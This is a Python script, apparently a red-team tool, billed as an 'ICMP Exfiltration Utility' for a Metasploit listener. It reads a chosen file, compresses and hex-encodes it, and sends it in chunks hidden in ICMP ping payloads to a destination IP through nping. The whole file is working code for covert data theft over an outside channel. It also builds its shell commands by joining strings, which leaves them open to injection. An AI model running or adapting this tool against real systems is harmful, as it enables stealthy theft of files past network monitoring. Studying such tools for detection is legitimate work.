__author__ = 'khanta'
import argparse
import sys
import datetime
import subprocess
import socket
import binascii
import hashlib
import zlib
import platform
import os
import signal

debug = 0
nping = ''
exfilhash = ''
# https://raw.githubusercontent.com/todb/junkdrawer/master/exfiltrate-data.rb
# https://community.rapid7.com/community/metasploit/blog/2014/01/01/fun-with-icmp-exfiltration
#TODO Add size for payload
def signal_handler(signal, frame):
        print('CTRL-C Pressed. Exiting.')
        sys.exit(0)
signal.signal(signal.SIGINT, signal_handler)


def is64bit():
    if platform.machine().endswith('64'):
        return True
    else:
        return False


def bytes_from_file(filename, chunksize=512):
    with open(filename, 'rb') as f:
        while True:
            chunk = f.read(chunksize)
            if chunk:
                yield chunk
            else:
                break


def readfile(filename):
    with open(filename, 'rb') as f:
        data = f.read()
    return data


def exfildata(ipaddress, file, compress, npinglocation, chunksize):
    status = True
    error = ''
    global exfilhash
    chunksize = 2048
    x = 0
    subprocess.call(npinglocation + ' ' + ipaddress + ' --icmp -H --quiet -c 1 --data-string "BOF' + str(file) + '"',
                    stdout=None)
    data = readfile(file)
    if compress:
        new_data = zlib.compress(data)
    else:
        new_data = data
    hexdata = binascii.hexlify(bytearray(new_data))
    exfilhash = (hashlib.md5(hexdata).hexdigest())
    hex_string = "".join("%02x" % b for b in hexdata)
    chunks = int(round(len(hex_string) / chunksize))

    for i in range(len(hex_string)):
        chunk = hex_string[x:chunksize + x]
        if chunk:
            subprocess.call(npinglocation + ' ' + ipaddress + ' --icmp -H --quiet -c 1 -data ' + chunk, stdout=None)
            print('| Chunks remaining: ' + str(chunks).ljust(55) + '|\r', end="")
            chunks -= 1
            x += chunksize
        else:
            break
    d = subprocess.call(npinglocation + ' ' + ipaddress + ' --icmp -H --quiet -c 1 --data-string "EOF"', stdout=None)
    return status, error


def genMD5(file):
    with open(file, 'rb') as file_to_check:
        data = file_to_check.read()
    return hashlib.md5(data).hexdigest()


def validateIP(ipaddress):
    status = True
    error = ''
    try:
        socket.inet_aton(ipaddress)
    except socket.error:
        error = "Invalid IP Address."
        status = False
    finally:
        return status, error


def validateFile(file):
    status = True
    error = ''
    try:
        if os.path.isfile(file):
            status = True
        else:
            status = False
            error = 'File ' + str(file) + ' does not exist.'
    except:
        status = False
        error = 'File ' + str(file) + ' does not exist.'
    finally:
        return status, error


def npingcheck():
    status = True
    error = ''

    global nping
    try:
        if is64bit():
            if os.path.isfile("c:\\Program Files (x86)\\Nmap\\nping.exe"):
                nping = '"c:\\Program Files (x86)\\Nmap\\nping.exe"'
                status = True
        else:
            if os.path.isfile("c:\\Program Files\\Nmap\\nping.exe"):
                nping = '"c:\\Program Files\\Nmap\\nping.exe"'
                status = True
    except:
        status = False
        error = 'File nping does not exist.'
    finally:
        return status, error


def Header(ipaddress, file, compress, chunksize):
    global exfilhash
    print('')
    print('+--------------------------------------------------------------------------+')
    print('|ICMP Exfiltration Utility                                                 |')
    print('+---------------------------------------------------------------------------')
    print('|Author: Tahir Khan - tkhan9@gmu.edu                                       |')
    print('+--------------------------------------------------------------------------+')
    print('| Date Run: ' + str(datetime.datetime.now()).ljust(63) + '|')
    print('+--------------------------------------------------------------------------+')
    print('| Destination IP: ' + str(ipaddress).ljust(57) + '|')
    print('+--------------------------------------------------------------------------+')
    print('| Source File    : ' + str(file).ljust(56) + '|')
    print('| Source File MD5: ' + str(genMD5(file)).ljust(56) + '|')
    if compress:
        print('| Compression enabled.                                                     |')
    if chunksize >= 1:
        print('| Size of chunk: ' + str(chunksize).ljust(58) + '|')
    print('+--------------------------------------------------------------------------+')


def Completed():
    print('+--------------------------------------------------------------------------+')
    print('| Transferred file MD5: ' + str(exfilhash).ljust(51) + '|')
    print('+--------------------------------------------------------------------------+')
    print('| [*] Completed.                                                           |')
    print('+--------------------------------------------------------------------------+')


def Failed(error):
    print('  * Error: ' + str(error))
    print('+--------------------------------------------------------------------------+')
    print('| Failed.                                                                  |')
    print('+--------------------------------------------------------------------------+')
    sys.exit(1)


def main(argv):
    #try:
    compress = False
    chunksize = 0
    #parse the command-line arguments
    parser = argparse.ArgumentParser(description="ICMP exfiltration utility for Metasploit icmp_exfil.", add_help=True)
    parser.add_argument('-i', '--ipaddress', help='The destination IP Address.', required=True)
    parser.add_argument('-f', '--file', help='The file to exfiltrate.', required=True)
    #parser.add_argument('-s', '--size', help='Size of data packet (This will be double due to encoding).',
    #                    required=False)
    parser.add_argument('-c', '--compress',
                        help='Enable zlib compression. To retrieve "cat <file> | xxd -r -ps | openssl zlib -d | tee >(md5sum) > <outfile>"',
                        action='store_true', required=False)
    parser.add_argument('--version', action='version', version='%(prog)s 1.0')
    args = parser.parse_args()
    if args.ipaddress:
        ipaddress = args.ipaddress
    if args.file:
        file = args.file
    if args.compress:
        compress = True
    #if args.size:
    #    chunksize = int(args.size)
    Header(ipaddress, file, compress, chunksize)
    print('| [#] Checking for nping.                                                  |')
    status, error = npingcheck()
    if status:
        print('| [+] Success.                                                             |')
    else:
        print('| [-] Failed.                                                              |')
        Failed(error)
    print('| [#] Validating File.                                                     |')
    status, error = validateFile(file)
    if status:
        print('| [+] Success.                                                             |')
    else:
        print('| [-] Failed.                                                              |')
        Failed(error)
    print('| [#] Validating IP Address.                                               |')
    status, error = validateIP(ipaddress)
    if status:
        print('| [+] Success.                                                             |')
    else:
        print('| [-] Failed.                                                              |')
        Failed(error)
    print('| [#] Exfiltrating Data.                                                   |')
    status, error = exfildata(ipaddress, file, compress, nping, chunksize)
    if status:
        print('| [+] Success.                                                             |')
    else:
        print('| [-] Failed.                                                              |')
        Failed(error)
    Completed()

    #except:
    #    sys.exit(1)


main(sys.argv[1:])



